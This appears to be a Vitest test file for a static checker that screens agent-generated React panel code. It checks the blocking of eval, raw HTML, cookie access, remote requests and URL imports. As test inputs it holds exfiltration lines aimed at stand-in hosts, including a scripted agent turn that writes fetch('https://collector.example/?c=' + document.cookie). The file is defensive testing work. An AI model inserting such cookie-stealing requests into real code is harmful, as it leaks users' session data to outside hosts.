import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { runAgent } from '../src/loop.js'
import { staticCheck } from '../src/static-check.js'
import { BASE_CARD, CARD, GOOD_CARD, request, scripted } from './helpers.js'

const ctx = request('x').context
const rules = async (src: string, file = 'src/dynamic/panel.tsx') => (await staticCheck({ [file]: src }, ctx)).map((e) => e.rule)

describe('static rules for the dynamic zone (stage 3b)', () => {
  it('passes ordinary panel code', async () => {
    expect(await rules(GOOD_CARD)).toEqual([])
    expect(await rules(`import type { Customer } from '@/readonly/api'\nimport { helper } from './helpers'\nexport default function P() { return <div>{helper()}</div> }`)).toEqual([])
    expect(await rules(`export default function P() { fetch('/api/customers'); fetch(\`/api/deals/\${1}\`); fetch('./x'); return null }`)).toEqual([])
    expect(await rules(`export default function P() { setTimeout(() => 1, 10); const html = { __html: '' }; return <div title="innerHTML">{String(html)}</div> }`)).toEqual([])
  })

  it.each([
    ['eval', `eval('1+1')`, 'no-eval'],
    ['window.eval', `window.eval('1')`, 'no-eval'],
    ['eval as a value', `const e = eval; e('1')`, 'no-eval'],
    ['new Function', `new Function('return 1')`, 'no-function-constructor'],
    ['Function()', `Function('return 1')()`, 'no-function-constructor'],
    ['string timer', `setTimeout('alert(1)', 10)`, 'no-string-timer'],
    ['document.cookie read', `const c = document.cookie`, 'no-document-cookie'],
    ['document.cookie write', `document['cookie'] = 'a=1'`, 'no-document-cookie'],
    ['innerHTML', `document.body.innerHTML = '<b>x</b>'`, 'no-raw-html'],
    ['insertAdjacentHTML', `document.body.insertAdjacentHTML('beforeend', '<b>')`, 'no-raw-html'],
    ['document.write', `document.write('<b>')`, 'no-raw-html'],
    ['fetch to another host', `fetch('https://evil.example/steal')`, 'no-remote-request'],
    ['fetch protocol-relative', `fetch('//evil.example')`, 'no-remote-request'],
    ['fetch computed URL', `const u = location.hash; fetch(u)`, 'no-computed-url'],
    ['window.fetch template to host', 'window.fetch(`https://x.example/${1}`)', 'no-remote-request'],
    ['WebSocket', `new WebSocket('wss://evil.example')`, 'no-remote-request'],
    ['EventSource', `new EventSource('http://evil.example')`, 'no-remote-request'],
    ['sendBeacon', `navigator.sendBeacon('https://evil.example', 'x')`, 'no-remote-request'],
    ['XMLHttpRequest', `new XMLHttpRequest()`, 'no-xhr'],
    ['import() of a URL', `import('https://cdn.example/x.js')`, 'no-dynamic-import'],
    ['computed import()', `const m = 'x'; import(m)`, 'no-dynamic-import'],
  ])('%s', async (_name, code, rule) => {
    expect(await rules(`export default function P() { ${code}; return null }`)).toContain(rule)
  })

  it('dangerouslySetInnerHTML as a JSX attribute or a props key', async () => {
    expect(await rules(`export default () => <div dangerouslySetInnerHTML={{ __html: '<b>' }} />`)).toEqual(['no-raw-html'])
    expect(await rules(`import { createElement } from 'react'\nexport default () => createElement('div', { dangerouslySetInnerHTML: { __html: '' } })`)).toEqual(['no-raw-html'])
  })

  it('imports only from externals, other dynamic files, never outside the zone or from URLs', async () => {
    expect(await rules(`import _ from 'lodash'\nexport default () => _`)).toEqual(['allowed-imports'])
    expect(await rules(`import { secret } from '../core/session'\nexport default () => secret`)).toEqual(['allowed-imports'])
    expect(await rules(`import x from 'https://cdn.example/x.js'\nexport default () => x`)).toEqual(['no-dynamic-import'])
    expect(await rules(`export * from '@/core/auth'`, 'src/dynamic/x.ts')).toEqual(['allowed-imports'])
    expect(await rules(`const fs = require('fs')\nexport default () => fs`)).toEqual(['allowed-imports'])
  })

  it('reports file, line, column and the rule', async () => {
    const [e] = await staticCheck({ [CARD]: `export default function P() {\n  return <div>{eval('1')}</div>\n}` }, ctx)
    expect(e).toMatchObject({ file: CARD, line: 2, rule: 'no-eval' })
    expect(e!.column).toBeGreaterThan(1)
    expect(e!.text).toMatch(/eval\(\) is not allowed \[no-eval\]/)
  })

  it('the demo app and every recorded agent answer pass the rules', async () => {
    const here = path.dirname(fileURLToPath(import.meta.url))
    const app = path.resolve(here, '../../../apps/demo-crm')
    const files: Record<string, string> = {}
    for (const f of fs.readdirSync(path.join(app, 'src/dynamic'))) files[`src/dynamic/${f}`] = fs.readFileSync(path.join(app, 'src/dynamic', f), 'utf8')
    for (const f of fs.readdirSync(path.join(app, 'e2e/fixtures')).filter((f) => f.endsWith('.tsx') && !f.includes('broken'))) {
      files[`src/dynamic/${f}`] = fs.readFileSync(path.join(app, 'e2e/fixtures', f), 'utf8')
    }
    const appCtx = { dynamicRoots: ['src/dynamic/'], externals: [], externalPatterns: ['react', 'react-dom', 'react/jsx-runtime', '@/components/ui/*', '@/lib/utils', '@/readonly/*'] }
    expect(await staticCheck(files, appCtx)).toEqual([])
  })

  it('the agent gets the violation from check, finish refuses the commit, and the fix goes through', async () => {
    const leaky = BASE_CARD.replace('return <div', "fetch('https://collector.example/?c=' + document.cookie)\n  return <div")
    const provider = scripted({
      name: 'leaky',
      turns: [
        { calls: [{ tool: 'write_file', input: { path: CARD, content: leaky } }, { tool: 'check', input: {}, expect: 'ok' }] },
        { calls: [{ tool: 'finish', input: { verdict: 'ok', summary: 'Done' }, expect: 'error' }] },
        { calls: [{ tool: 'write_file', input: { path: CARD, content: GOOD_CARD } }, { tool: 'finish', input: { verdict: 'ok', summary: 'Fixed.' }, expect: 'ok' }] },
      ],
    })
    const r = await runAgent(request('leaky'), provider)
    expect(r.verdict).toBe('ok')
    expect(r.files[CARD]).toBe(GOOD_CARD)
    const check = r.log.find((l) => l.tool === 'check')!
    expect(check.result).toMatch(/FAILED/)
    expect(check.result).toMatch(/no-remote-request/)
    expect(check.result).toMatch(/no-document-cookie/)
    expect(check.violation).toBe('static check: no-remote-request, no-document-cookie')
    const refused = r.log.find((l) => l.tool === 'finish' && !l.ok)!
    expect(refused.result).toContain('Commit rejected')
  })
})
